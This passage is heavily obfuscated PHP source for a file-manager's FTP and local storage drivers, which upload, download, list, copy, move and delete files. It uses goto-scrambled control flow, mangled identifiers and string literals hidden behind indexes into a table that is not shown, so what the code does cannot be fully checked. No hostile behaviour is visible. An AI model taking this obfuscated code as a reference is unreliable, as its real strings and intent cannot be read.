(!$this->isFolder($A–í©¶Ñ¦“)) { return !0; } } else { if ($this->isFolder($A–í©¶Ñ¦“)) { return !0; } } } return !1; goto bÓìÂŠßğ; eŒÔ³ªÜæ²: $ağ“Üºù‡Ó = $this->ftpList($A–í©¶Ñ¦“); if (!$ağ“Üºù‡Ó) { return !1; } if ($Cš°âô²Ğï) { return array($Dé«í¹á¤²[201] => 0, $Dé«í¹á¤²[202] => count($ağ“Üºù‡Ó)); } goto C‹²Ë§Ò‡; aæö©’‰·×: $Dé«í¹á¤² =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->_isconn()) { return !1; } $A–í©¶Ñ¦“ = $this->iconvSystem($A–í©¶Ñ¦“); goto eŒÔ³ªÜæ²; bÓìÂŠßğ: } public function listAll($d„Œ…Ãˆ‡) { goto a”»®Á†÷ô; C °™ÁÒ  : foreach ($a¤÷¼©¾¼é[$dîñÂçÙ×Ş[84]] as $Eºìèœ³Ä±) { $E¤Äâè„Äô[] = array($dîñÂçÙ×Ş[85] => $dîñÂçÙ×Ş[18] . trim(str_replace($d„Œ…Ãˆ‡, $dîñÂçÙ×Ş[43], $Eºìèœ³Ä±), $dîñÂçÙ×Ş[18]) . $dîñÂçÙ×Ş[18], $dîñÂçÙ×Ş[86] => 1, $dîñÂçÙ×Ş[87] => 0); } foreach ($a¤÷¼©¾¼é[$dîñÂçÙ×Ş[83]] as $aâ­†„Œ†) { $E¤Äâè„Äô[] = array($dîñÂçÙ×Ş[85] => $dîñÂçÙ×Ş[18] . trim(str_replace($d„Œ…Ãˆ‡, $dîñÂçÙ×Ş[43], $aâ­†„Œ†), $dîñÂçÙ×Ş[18]), $dîñÂçÙ×Ş[86] => 0, $dîñÂçÙ×Ş[87] => $this->size($aâ­†„Œ†)); } return $E¤Äâè„Äô; goto dŒÖ«‹õÉª; a”»®Á†÷ô: $dîñÂçÙ×Ş =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->_isconn()) { return !1; } $d„Œ…Ãˆ‡ = $this->iconvSystem($d„Œ…Ãˆ‡); goto A­Å¹²ÈÅ; A­Å¹²ÈÅ: $a¤÷¼©¾¼é = array($dîñÂçÙ×Ş[83] => array(), $dîñÂçÙ×Ş[84] => array()); $this->recursionFtpFiles($d„Œ…Ãˆ‡, $a¤÷¼©¾¼é); $E¤Äâè„Äô = array(); goto C °™ÁÒ  ; dŒÖ«‹õÉª: } public function getContent($eÒÅ²‚Ô‘˜) { if (!$this->_isconn()) { return !1; } $eÒÅ²‚Ô‘˜ = $this->iconvSystem($eÒÅ²‚Ô‘˜); return $this->fileSubstr($eÒÅ²‚Ô‘˜); } public function setContent($DÒ«£‰‘é, $a•—Ï‘¿ = '') { goto bÎÇâ…ÎØ“; FÛ¡ÌØšãÁ: return $EšõŒ‰ğó; goto d¾ğµ´Ÿİ”; FöáùÊå‡„: file_put_contents($dÌ‚”¡éîÛ, $a•—Ï‘¿); $EšõŒ‰ğó = $this->upload($DÒ«£‰‘é, $this->iconvApp($dÌ‚”¡éîÛ)); $this->tempFileRemve($dÌ‚”¡éîÛ); goto FÛ¡ÌØšãÁ; bÎÇâ…ÎØ“: if (!$this->_isconn()) { return !1; } $F‡–±ó­ÈØ = $this->pathThis($this->iconvSystem($DÒ«£‰‘é)); $dÌ‚”¡éîÛ = $this->tempFile($F‡–±ó­ÈØ); goto FöáùÊå‡„; d¾ğµ´Ÿİ”: } public function fileSubstr($D«ñ¹Æ°•, $D´Æ²Õ¯Ê„ = 0, $b—×ù î¹Ã = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($D«ñ¹Æ°•, $D´Æ²Õ¯Ê„, $b—×ù î¹Ã); } private function ftpRequest($fôöÎÌšî†, $c³›Ë”•ˆ• = 0, $e’´£´ö÷— = false) { goto Eáù¤¾ £©; cé›‚‡È†Î: curl_setopt($EëĞ£Ù¹‡º, CURLOPT_RETURNTRANSFER, 1); $F‘©Èö®…ƒ = curl_exec($EëĞ£Ù¹‡º); curl_close($EëĞ£Ù¹‡º); goto f—æ‹æÜŸ…; aÃ®´éĞ…®: curl_setopt($EëĞ£Ù¹‡º, CURLOPT_URL, $A¹¯ó…ºåØ . $this->pathEncode($fôöÎÌšî†)); curl_setopt($EëĞ£Ù¹‡º, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($e’´£´ö÷—) { $DéŸ…‚„Åì = $c³›Ë”•ˆ• + $e’´£´ö÷— - 1; curl_setopt($EëĞ£Ù¹‡º, CURLOPT_RANGE, "{$c³›Ë”•ˆ•}\55{$DéŸ…‚„Åì}"); } goto cé›‚‡È†Î; Eáù¤¾ £©: $fôöÎÌšî† = $this->iconvSystem($fôöÎÌšî†); $A¹¯ó…ºåØ = $this->scheme . $this->host . $_SERVER[çŞáÓæÚô‚Ô‡][4] . $this->port; $EëĞ£Ù¹‡º = curl_init(); goto aÃ®´éĞ…®; f—æ‹æÜŸ…: return $F‘©Èö®…ƒ; goto c¿Ğ¡Âºˆ; c¿Ğ¡Âºˆ: } public function upload($eÄšåÛ‚÷ˆ, $Bğ–ª—æ×°, $F¦ƒĞÔÎ‘¾ = false, $F­±¨ë¡©¨ = REPEAT_REPLACE) { goto c‚¿Ö‰Ÿš‰; c‚¿Ö‰Ÿš‰: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($eÄšåÛ‚÷ˆ))) { return !1; } $eÄšåÛ‚÷ˆ = $this->iconvSystem($eÄšåÛ‚÷ˆ); goto c×½×¦ ˆÇ; eÀšÏ‹ÍŠÑ: if ($b¢·àæÚ™Ê != FTP_FINISHED) { return !1; } return $this->getPathOuter($eÄšåÛ‚÷ˆ); goto c—ÍÜº¿å; c×½×¦ ˆÇ: $Bğ–ª—æ×° = $this->iconvSystem($Bğ–ª—æ×°); $b¢·àæÚ™Ê = ftp_nb_put($this->connect, $eÄšåÛ‚÷ˆ, $Bğ–ª—æ×°, FTP_BINARY); while ($b¢·àæÚ™Ê == FTP_MOREDATA) { $b¢·àæÚ™Ê = ftp_nb_continue($this->connect); } goto eÀšÏ‹ÍŠÑ; c—ÍÜº¿å: } public function download($C‚¯ĞÄÀ¸, $dàåÀ–»ä‚ = '') { goto aå†áÈîÜ„; EáÏ´âÛ½‹: while ($DŒ—‰¸‹ì == FTP_MOREDATA) { $DŒ—‰¸‹ì = ftp_nb_continue($this->connect); } if ($DŒ—‰¸‹ì != FTP_FINISHED) { return !1; } return $this->iconvApp($dàåÀ–»ä‚); goto DËï«øÖá; aå†áÈîÜ„: if (!$this->_isconn()) { return !1; } $a¹¿‹«æ‡· = $this->pathFather($dàåÀ–»ä‚); if (!IO::mkdir($a¹¿‹«æ‡·)) { return !1; } goto D‚“²¦›Ï; D‚“²¦›Ï: $C‚¯ĞÄÀ¸ = $this->iconvSystem($C‚¯ĞÄÀ¸); $dàåÀ–»ä‚ = $this->iconvSystem($dàåÀ–»ä‚); $DŒ—‰¸‹ì = ftp_nb_get($this->connect, $dàåÀ–»ä‚, $C‚¯ĞÄÀ¸, FTP_BINARY); goto EáÏ´âÛ½‹; DËï«øÖá: } private function ftpList($AâÕ–¦ÇóÄ) { goto aè¶ó—–; e™»‚ó¤ƒ³: $AâÕ–¦ÇóÄ = rtrim($AâÕ–¦ÇóÄ, $dóŠÓŸµÕ³[18]) . $dóŠÓŸµÕ³[18]; $EˆöáçŠ´ = @ftp_nlist($this->connect, $AâÕ–¦ÇóÄ); if ($EˆöáçŠ´ === !1) { $EˆöáçŠ´ = @ftp_rawlist($this->connect, $AâÕ–¦ÇóÄ); foreach ($EˆöáçŠ´ as $E±ˆ¸¤õî° => $dØ¥¤ä ƒ¤) { $EˆöáçŠ´[$E±ˆ¸¤õî°] = end(explode($dóŠÓŸµÕ³[1171], $dØ¥¤ä ƒ¤)); } } goto CÏ¥‘îÔ÷¼; aè¶ó—–: $dóŠÓŸµÕ³ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->isFolder($AâÕ–¦ÇóÄ)) { return !1; } @ftp_chdir($this->connect, $dóŠÓŸµÕ³[18]); goto e™»‚ó¤ƒ³; CÏ¥‘îÔ÷¼: $EˆöáçŠ´ = array_diff($EˆöáçŠ´, array($dóŠÓŸµÕ³[101], $dóŠÓŸµÕ³[1172], $AâÕ–¦ÇóÄ . $dóŠÓŸµÕ³[101], $AâÕ–¦ÇóÄ . $dóŠÓŸµÕ³[1172])); $c‡ÀÚ³ôâÌ = array(); foreach ($EˆöáçŠ´ as $CøîäæÅ¯) { if (!strstr($CøîäæÅ¯, $dóŠÓŸµÕ³[18])) { $CøîäæÅ¯ = $AâÕ–¦ÇóÄ . ltrim($CøîäæÅ¯, $dóŠÓŸµÕ³[18]); } $c‡ÀÚ³ôâÌ[] = $this->iconvApp($CøîäæÅ¯); } goto D—ÑƒèÌ•; D—ÑƒèÌ•: return $c‡ÀÚ³ôâÌ; goto A“éò©Ö‘½; A“éò©Ö‘½: } private function recursionFtpFiles($a¢ÛÌºõá , &$bÊ‡½ªÂŸé) { $bÀ¿åÃùˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->_isconn()) { return !1; } if (!($Dîå©õë½ = $this->ftpList($a¢ÛÌºõá ))) { return !1; } foreach ($Dîå©õë½ as $a¢ÛÌºõá ) { if ($this->isFolder($a¢ÛÌºõá )) { $this->recursionFtpFiles($a¢ÛÌºõá , $bÊ‡½ªÂŸé); $bÊ‡½ªÂŸé[$bÀ¿åÃùˆ[84]][] = $a¢ÛÌºõá ; } else { $bÊ‡½ªÂŸé[$bÀ¿åÃùˆ[83]][] = $a¢ÛÌºõá ; } } } private function objectMeta($cçÙ§è±æí) { goto Fí‚Ì˜; D´„§½öµÏ: return $cšò‘ƒ«¿Õ; goto aæÊ—×Î™; bù‹ŸîÎÚ‰: if ($cšò‘ƒ«¿Õ !== null && $cšò‘ƒ«¿Õ !== !1) { return $cšò‘ƒ«¿Õ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $F©œ×ğÀ§[18]); goto Bè…—Èîí; Fí‚Ì˜: $F©œ×ğÀ§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d½œğÈµ©Ù = $F©œ×ğÀ§[1173] . md5($cçÙ§è±æí); $cšò‘ƒ«¿Õ = Cache::get($d½œğÈµ©Ù); goto bù‹ŸîÎÚ‰; Bè…—Èîí: $a£¬óï”•İ = @ftp_size($this->connect, $this->iconvSystem($cçÙ§è±æí)); if ($a£¬óï”•İ != -1) { $cšò‘ƒ«¿Õ = array($F©œ×ğÀ§[87] => $a£¬óï”•İ, $F©œ×ğÀ§[39] => $F©œ×ğÀ§[177]); } else { $FŸç§ÍòÜ = @ftp_chdir($this->connect, $this->iconvSystem($cçÙ§è±æí)); $cšò‘ƒ«¿Õ = $FŸç§ÍòÜ ? array($F©œ×ğÀ§[87] => 0, $F©œ×ğÀ§[39] => $F©œ×ğÀ§[86]) : !1; } Cache::set($d½œğÈµ©Ù, $cšò‘ƒ«¿Õ, 0); goto D´„§½öµÏ; aæÊ—×Î™: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fªãÍºêº) { if (substr($fªãÍºêº, 0, 2) == $_SERVER[çŞáÓæÚô‚Ô‡][1162]) { $fªãÍºêº = BASIC_PATH . substr($fªãÍºêº, 2); } return $fªãÍºêº; } public function iconvApp($CŒ‰İ˜‚ªé) { $AĞÅô¥ÊŠñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $config; return $this->iconvTo($CŒ‰İ˜‚ªé, $config[$AĞÅô¥ÊŠñ[1160]], $config[$AĞÅô¥ÊŠñ[1159]]); } public function iconvSystem($eß×İÇÅ•) { $A‡£¶èä¥‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $config; return $this->iconvTo($eß×İÇÅ•, $config[$A‡£¶èä¥‡[1159]], $config[$A‡£¶èä¥‡[1160]]); } public function getPathOuter($dØ¾„¶Ùëö) { goto cØâá‡º²“; cØâá‡º²“: $C÷ÔÌÒ¢ŒŸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B•Ã÷İ§° = $this->iconvApp($this->pathBase); $dØ¾„¶Ùëö = $this->iconvApp($dØ¾„¶Ùëö); goto aÇ‹ä±±«; AøÀÈ¤÷«Ÿ: $dØ¾„¶Ùëö = KodIO::clear($dØ¾„¶Ùëö); $dØ¾„¶Ùëö = substr($dØ¾„¶Ùëö, strlen($B•Ã÷İ§°)); if (empty($this->pathDriver)) { return $dØ¾„¶Ùëö; } goto Dƒ”ù©ÛãÙ; aÇ‹ä±±«: if (substr($B•Ã÷İ§°, 0, 2) == $C÷ÔÌÒ¢ŒŸ[1162]) { $B•Ã÷İ§° = BASIC_PATH . substr($B•Ã÷İ§°, 2); } if (substr($dØ¾„¶Ùëö, 0, 2) == $C÷ÔÌÒ¢ŒŸ[1162]) { $dØ¾„¶Ùëö = BASIC_PATH . substr($dØ¾„¶Ùëö, 2); } $B•Ã÷İ§° = KodIO::clear($B•Ã÷İ§°); goto AøÀÈ¤÷«Ÿ; Dƒ”ù©ÛãÙ: return $this->pathDriver . $C÷ÔÌÒ¢ŒŸ[18] . ltrim($dØ¾„¶Ùëö, $C÷ÔÌÒ¢ŒŸ[18]); goto aœùÁ‹Ê©; aœùÁ‹Ê©: } public function mkfile($BÄÑì­¡¨â, $EÈ‰‚ã‹İ = '', $aéÛØİ‡ = REPEAT_RENAME) { $BÄÑì­¡¨â = $this->iconvSystem($BÄÑì­¡¨â); @touch($BÄÑì­¡¨â); if ($EÈ‰‚ã‹İ) { file_put_contents($BÄÑì­¡¨â, $EÈ‰‚ã‹İ); } return is_file($BÄÑì­¡¨â) ? $this->getPathOuter($BÄÑì­¡¨â) : !1; } public function mkdir($F¢’ÙµÃ¼‰, $a¾ùçÑÚÚœ = REPEAT_SKIP) { $F¢’ÙµÃ¼‰ = $this->iconvSystem($F¢’ÙµÃ¼‰); if (is_dir($F¢’ÙµÃ¼‰)) { return $this->getPathOuter($F¢’ÙµÃ¼‰); } @mkdir($F¢’ÙµÃ¼‰, 511, !0); return is_dir($F¢’ÙµÃ¼‰) ? $this->getPathOuter($F¢’ÙµÃ¼‰) : !1; } public function copyFile($CŠéŠ¦öõ, $AÚ¾õµ»èÖ) { $this->mkdir($this->pathFather($AÚ¾õµ»èÖ)); $CŠéŠ¦öõ = $this->iconvSystem($CŠéŠ¦öõ); $AÚ¾õµ»èÖ = $this->iconvSystem($AÚ¾õµ»èÖ); $F’À‹õ»Îã = @copy($CŠéŠ¦öõ, $AÚ¾õµ»èÖ); return $F’À‹õ»Îã ? $this->getPathOuter($AÚ¾õµ»èÖ) : !1; } public function moveFile($AìŞ¤ËÆ°†, $A×—ÓÃ´ë§) { $this->mkdir($this->pathFather($A×—ÓÃ´ë§)); $AìŞ¤ËÆ°† = $this->iconvSystem($AìŞ¤ËÆ°†); $A×—ÓÃ´ë§ = $this->iconvSystem($A×—ÓÃ´ë§); $eŸ÷‚™„ì˜ = intval(@rename($AìŞ¤ËÆ°†, $A×—ÓÃ´ë§)); if (!$eŸ÷‚™„ì˜) { if ($eŸ÷‚™„ì˜ = intval(@copy($AìŞ¤ËÆ°†, $A×—ÓÃ´ë§))) { @unlink($AìŞ¤ËÆ°†); } } return $eŸ÷‚™„ì˜ ? $this->getPathOuter($A×—ÓÃ´ë§) : !1; } public function delFile($e–…î—ôŒá) { $e–…î—ôŒá = $this->iconvSystem($e–…î—ôŒá); if (!@unlink($e–…î—ôŒá)) { @chmod($e–…î—ôŒá, 511); if (!@unlink($e–…î—ôŒá)) { return !1; } } else { return !0; } } public function delFolder($c¿¢ÚçÅ˜à) { goto f‚˜ ¶ôï; f‚˜ ¶ôï: $cËØòèáâŸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c¿¢ÚçÅ˜à = $this->iconvSystem($c¿¢ÚçÅ˜à); if (!is_dir($c¿¢ÚçÅ˜à)) { return !0; } goto Fù’åõ¤“Õ; Fù’åõ¤“Õ: if (!($CÌäŒØº¹Ú = opendir($c¿¢ÚçÅ˜à))) { return !1; } while (($DÏôÏÕ©— = readdir($CÌäŒØº¹Ú)) !== !1) { if ($DÏôÏÕ©— == $cËØòèáâŸ[101] || $DÏôÏÕ©— == $cËØòèáâŸ[1172]) { continue; } $F…Ü£õ™‡Û = $c¿¢ÚçÅ˜à . $cËØòèáâŸ[18] . $DÏôÏÕ©—; if (is_file($F…Ü£õ™‡Û) || is_link($F…Ü£õ™‡Û)) { if (!unlink($F…Ü£õ™‡Û)) { chmod($F…Ü£õ™‡Û, 511); if (!unlink($F…Ü£õ™‡Û)) { return !1; } } } else { if (is_dir($F…Ü£õ™‡Û)) { chmod($F…Ü£õ™‡Û, 511); $F…Ü£õ™‡Û = $this->iconvApp($F…Ü£õ™‡Û); if (!$this->delFolder($F…Ü£õ™‡Û)) { return !1; } } } } closedir($CÌäŒØº¹Ú); goto c×ìåäø®‹; c×ìåäø®‹: return rmdir($c¿¢ÚçÅ˜à); goto EßÍ‚™ÑÃ; EßÍ‚™ÑÃ: } public function rename($e·®‘³’, $a‘©·ËÛÃë) { goto Bá—ÓŒŞ¥İ; eÚóœî„ÇÑ: $e·®‘³’ = $this->iconvSystem($e·®‘³’); $c¥Ã´ó© = $this->pathFather($e·®‘³’); $aøÄ©¯‰÷ = rtrim($c¥Ã´ó©, $C¤ßÁ™ÈÀ[18]) . $C¤ßÁ™ÈÀ[18] . $fº‚è²ùŠö; goto Eã³·¬¾ê; Bá—ÓŒŞ¥İ: $C¤ßÁ™ÈÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fº‚è²ùŠö = $this->fileNameAuto($this->pathFather($e·®‘³’), $a‘©·ËÛÃë); $fº‚è²ùŠö = $this->iconvSystem($fº‚è²ùŠö); goto eÚóœî„ÇÑ; Eã³·¬¾ê: $DóõÉÌÑ¹© = @rename($e·®‘³’, $aøÄ©¯‰÷); $aøÄ©¯‰÷ = $this->iconvApp($aøÄ©¯‰÷); return $DóõÉÌÑ¹© ? $this->getPathOuter($aøÄ©¯‰÷) : !1; goto AÄ˜¶¯‘«Ú; AÄ˜¶¯‘«Ú: } public function size($e¿ø†Õ›•ù) { $e¿ø†Õ›•ù = $this->iconvSystem($e¿ø†Õ›•ù); return (double) abs(sprintf($_SERVER[çŞáÓæÚô‚Ô‡][1174], @filesize($e¿ø†Õ›•ù))); } public function info($CÊÍíÖÖé) { $CÊÍíÖÖé = $this->iconvSystem($CÊÍíÖÖé); if ($this->isFolder($CÊÍíÖÖé)) { return $this->folderInfo($CÊÍíÖÖé); } else { if ($this->isFile($CÊÍíÖÖé)) { return $this->fileInfo($CÊÍíÖÖé); } } return !1; } protected function infoChildren($Fí²˜ÄÛ…, &$fµÚ‡ÁíÃª, $fŞÅŸ™½ğ± = true) { goto EÎ¯˜£Ç·; bìçÑô…Ï†: closedir($fÖíÕ±ííì); goto fÍÊÙóèƒ¹; fĞ”šãŒ: if ($fŞÅŸ™½ğ±) { $Fí²˜ÄÛ… = $this->iconvSystem($Fí²˜ÄÛ…); } if (!($fÖíÕ±ííì = @opendir($Fí²˜ÄÛ…))) { return; } while (($d­ŠĞÈå = readdir($fÖíÕ±ííì)) !== !1) { if ($d­ŠĞÈå == $F–ÌˆÄÒ[101] || $d­ŠĞÈå == $F–ÌˆÄÒ[1172]) { continue; } $DìÁÑÙé¶´ = $Fí²˜ÄÛ… . $d­ŠĞÈå; if (is_file($DìÁÑÙé¶´) || is_link($DìÁÑÙé¶´)) { $fµÚ‡ÁíÃª[$F–ÌˆÄÒ[88]]++; $fµÚ‡ÁíÃª[$F–ÌˆÄÒ[87]] += (double) abs(sprintf($F–ÌˆÄÒ[1174], @filesize($DìÁÑÙé¶´))); } else { if (is_dir($DìÁÑÙé¶´)) { $fµÚ‡ÁíÃª[$F–ÌˆÄÒ[89]]++; $this->infoChildren($DìÁÑÙé¶´, $fµÚ‡ÁíÃª, !1); } } } goto bìçÑô…Ï†; EÎ¯˜£Ç·: $F–ÌˆÄÒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; check_abort(); $Fí²˜ÄÛ… = rtrim($Fí²˜ÄÛ…, $F–ÌˆÄÒ[18]) . $F–ÌˆÄÒ[18]; goto fĞ”šãŒ; fÍÊÙóèƒ¹: } private function folderInfo($D¹ŒÖ‰, $CæŒÆšğôî = false) { $bÒ‚¥°¹Î =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¹ŒÖ‰ = rtrim($D¹ŒÖ‰, $bÒ‚¥°¹Î[18]) . $bÒ‚¥°¹Î[18]; $CµŠÅ…‡åë = $this->iconvApp($this->pathThis($D¹ŒÖ‰)); if ($CæŒÆšğôî) { return array($bÒ‚¥°¹Î[38] => $CµŠÅ…‡åë, $bÒ‚¥°¹Î[85] => $this->getPathOuter($D¹ŒÖ‰), $bÒ‚¥°¹Î[39] => $bÒ‚¥°¹Î[86]); } $bĞ‡´Š•¬’ = array($bÒ‚¥°¹Î[38] => $CµŠÅ…‡åë, $bÒ‚¥°¹Î[85] => $this->getPathOuter($D¹ŒÖ‰), $bÒ‚¥°¹Î[39] => $bÒ‚¥°¹Î[86], $bÒ‚¥°¹Î[197] => @filectime($D¹ŒÖ‰), $bÒ‚¥°¹Î[117] => @filemtime($D¹ŒÖ‰), $bÒ‚¥°¹Î[1175] => @fileatime($D¹ŒÖ‰), $bÒ‚¥°¹Î[1169] => is_readable($D¹ŒÖ‰), $bÒ‚¥°¹Î[1170] => is_writable($D¹ŒÖ‰), $bÒ‚¥°¹Î[1176] => get_mode($D¹ŒÖ‰)); return $bĞ‡´Š•¬’; } private function fileInfo($A”¿ĞƒÃ, $aîó˜²³£÷ = false) { $f¦‡¨ÈùÜ„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cá´ ê—äï = $this->iconvApp($this->pathThis($A”¿ĞƒÃ)); if ($aîó˜²³£÷) { return array($f¦‡¨ÈùÜ„[38] => $cá´ ê—äï, $f¦‡¨ÈùÜ„[85] => $this->getPathOuter($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[39] => $f¦‡¨ÈùÜ„[177], $f¦‡¨ÈùÜ„[87] => $this->size($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[170] => $this->ext($cá´ ê—äï)); } $C’Áà¨ò = array($f¦‡¨ÈùÜ„[38] => $cá´ ê—äï, $f¦‡¨ÈùÜ„[85] => $this->getPathOuter($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[39] => $f¦‡¨ÈùÜ„[177], $f¦‡¨ÈùÜ„[197] => @filectime($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[117] => @filemtime($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[1175] => @fileatime($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[87] => $this->size($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[170] => $this->ext($cá´ ê—äï), $f¦‡¨ÈùÜ„[1169] => is_readable($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[1170] => is_writable($A”¿ĞƒÃ), $f¦‡¨ÈùÜ„[1176] => get_mode($A”¿ĞƒÃ)); return $C’Áà¨ò; } public function exist($Eõìİ¨¯ÜÍ) { $Eõìİ¨¯ÜÍ = $this->iconvSystem($Eõìİ¨¯ÜÍ); return @file_exists($Eõìİ¨¯ÜÍ); } public function isFile($e î´àµ) { $e î´àµ = $this->iconvSystem($e î´àµ); return @is_file($e î´àµ); } public function isFolder($Bº¬ƒÓ¯Ğ¼) { $Bº¬ƒÓ¯Ğ¼ = $this->iconvSystem($Bº¬ƒÓ¯Ğ¼); return @is_dir($Bº¬ƒÓ¯Ğ¼); } public function listPath($C„ÉÍ§®ô‡, $bñã¢‚ÏŞÓ = false) { goto A«»ÆÔ‡ƒõ; A«»ÆÔ‡ƒõ: $bµƒğä¾âœ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C„ÉÍ§®ô‡ = $this->iconvSystem($C„ÉÍ§®ô‡); $C„ÉÍ§®ô‡ = rtrim($C„ÉÍ§®ô‡, $bµƒğä¾âœ[18]) . $bµƒğä¾âœ[18]; goto A¢ÛŠ¿ëˆ½; d¤¡âõ›„: closedir($Bè†Ü¢£ˆ£); return $bÊ¸ÀÕÖ¡¦; goto cˆµ¾êÕèŞ; A¢ÛŠ¿ëˆ½: $bÊ¸ÀÕÖ¡¦ = array($bµƒğä¾âœ[84] => array(), $bµƒğä¾âœ[83] => array()); if (!($Bè†Ü¢£ˆ£ = @opendir($C„ÉÍ§®ô‡))) { return $bÊ¸ÀÕÖ¡¦; } while (($B¿ö¦î¨ñÃ = readdir($Bè†Ü¢£ˆ£)) !== !1) { if ($B¿ö¦î¨ñÃ == $bµƒğä¾âœ[101] || $B¿ö¦î¨ñÃ == $bµƒğä¾âœ[1172]) { continue; } $A¥ùÀ›ÙÁ = $C„ÉÍ§®ô‡ . $B¿ö¦î¨ñÃ; if (is_file($A¥ùÀ›ÙÁ)) { $bÊ¸ÀÕÖ¡¦[$bµƒğä¾âœ[83]][] = $this->fileInfo($A¥ùÀ›ÙÁ, $bñã¢‚ÏŞÓ); } else { $bÊ¸ÀÕÖ¡¦[$bµƒğä¾âœ[84]][] = $this->folderInfo($A¥ùÀ›ÙÁ, $bñã¢‚ÏŞÓ); } } goto d¤¡âõ›„; cˆµ¾êÕèŞ: } public function listAll($dŒ‰®Ìé¹˜, &$FÒÎ…å•• = array()) { goto cÈ¨äœ¹©Ü; cÈ¨äœ¹©Ü: $a…Ø½´Ÿ¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dŒ‰®Ìé¹˜ = $this->iconvSystem($dŒ‰®Ìé¹˜); $dŒ‰®Ìé¹˜ = rtrim($dŒ‰®Ìé¹˜, $a…Ø½´Ÿ¸[18]) . $a…Ø½´Ÿ¸[18]; goto B† ±øî¨; dõô¬¸˜: return $FÒÎ…å••; goto cæì÷‰ÔÆ; B† ±øî¨: if (!($d¦÷‹°š†õ = @opendir($dŒ‰®Ìé¹˜))) { return $FÒÎ…å••; } while (($aÈ©¹ÌÔã— = readdir($d¦÷‹°š†õ)) !== !1) { if ($aÈ©¹ÌÔã— == $a…Ø½´Ÿ¸[101] || $aÈ©¹ÌÔã— == $a…Ø½´Ÿ¸[1172]) { continue; } $aê—ì¤ÊÅŞ = $dŒ‰®Ìé¹˜ . $aÈ©¹ÌÔã—; if (is_dir($aê—ì¤ÊÅŞ) && !is_link($aê—ì¤ÊÅŞ)) { $FÒÎ…å••[] = array($a…Ø½´Ÿ¸[85] => $aê—ì¤ÊÅŞ . $a…Ø½´Ÿ¸[18], $a…Ø½´Ÿ¸[86] => 1, $a…Ø½´Ÿ¸[117] => @filemtime($aê—ì¤ÊÅŞ), $a…Ø½´Ÿ¸[87] => 0); $this->listAll($aê—ì¤ÊÅŞ, $FÒÎ…å••); } else { $FÒÎ…å••[] = array($a…Ø½´Ÿ¸[85] => $aê—ì¤ÊÅŞ, $a…Ø½´Ÿ¸[86] => 0, $a…Ø½´Ÿ¸[117] => @filemtime($aê—ì¤ÊÅŞ), $a…Ø½´Ÿ¸[87] => $this->size($aê—ì¤ÊÅŞ)); } } closedir($d¦÷‹°š†õ); goto dõô¬¸˜; cæì÷‰ÔÆ: } public function has($DÌÏ•ôËÇ, $aÔóê­ÖÏá = false, $aøÄ”ÔãÇğ = true) { goto CÕµÊ¸¤Î; f«Ÿ‚Ôõ: $d˜íÀÚ’º = 0; while (($aÎïäöÈâ– = readdir($C‘ÃÖé»‹À)) !== !1) { if ($aÎïäöÈâ– == $Cé°ãŒÁğ‰[101] || $aÎïäöÈâ– == $Cé°ãŒÁğ‰[1172]) { continue; } $c˜œÍßÙˆé = $DÌÏ•ôËÇ . $aÎïäöÈâ–; if ($aÔóê­ÖÏá) { $d˜íÀÚ’º++; if (@is_file($c˜œÍßÙˆé)) { $dç×ùÅÅĞÈ++; } else { $e¶õ¹ÊÃ Ì++; } if ($d˜íÀÚ’º > 10000) { break; } continue; } if ($aøÄ”ÔãÇğ) { if (@is_file($c˜œÍßÙˆé)) { return !0; } } else { if (@is_dir($c˜œÍßÙˆé . $Cé°ãŒÁğ‰[18])) { return !0; } } } closedir($C‘ÃÖé»‹À); goto Fë™äÈä¯¾; Fë™äÈä¯¾: if ($aÔóê­ÖÏá) { return array($Cé°ãŒÁğ‰[201] => $dç×ùÅÅĞÈ, $Cé°ãŒÁğ‰[202] => $e¶õ¹ÊÃ Ì); } return !1; goto EÙ¯ê•®¾ê; c¾åÜßš½È: if (!($C‘ÃÖé»‹À = @opendir($DÌÏ•ôËÇ))) { return !1; } $dç×ùÅÅĞÈ = 0; $e¶õ¹ÊÃ Ì = 0; goto f«Ÿ‚Ôõ; CÕµÊ¸¤Î: $Cé°ãŒÁğ‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÌÏ•ôËÇ = $this->iconvSystem($DÌÏ•ôËÇ); $DÌÏ•ôËÇ = rtrim($DÌÏ•ôËÇ, $Cé°ãŒÁğ‰[18]) . $Cé°ãŒÁğ‰[18]; goto c¾åÜßš½È; EÙ¯ê•®¾ê: } public function hashSimple($Cíå§¤¹Ğˆ) { goto e°¼…ó™„‘; FØ²†ğèåó: $eîƒ‡©ÆŒ = $this->size($Cíå§¤¹Ğˆ); $cğ„ˆŸÑÕç = 200; $eª±Ş Ğø = 50; goto C¼µíÊÃ÷ø; e°¼…ó™„‘: $EçÂöÏ‰ĞÃ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$Cíå§¤¹Ğˆ) { return md5($EçÂöÏ‰ĞÃ[43]); } $Cíå§¤¹Ğˆ = $this->iconvSystem($Cíå§¤¹Ğˆ); goto FØ²†ğèåó; 